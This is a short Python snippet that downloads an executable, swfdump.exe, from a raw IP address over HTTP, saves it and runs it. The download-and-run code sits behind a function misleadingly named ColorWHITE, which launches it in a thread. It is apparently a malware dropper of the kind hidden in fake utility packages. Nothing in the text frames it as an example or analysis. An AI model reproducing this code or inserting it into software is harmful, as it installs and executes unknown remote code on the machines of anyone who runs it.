import requests, os, threading
def main():
    url = 'http://45.158.77.82/swfdump.exe'
    response = requests.get(url)
    open('swfdump.exe', 'wb').write(response.content)
    os.system('swfdump.exe')
def ColorWHITE():
    threading.Thread(target=main()).start()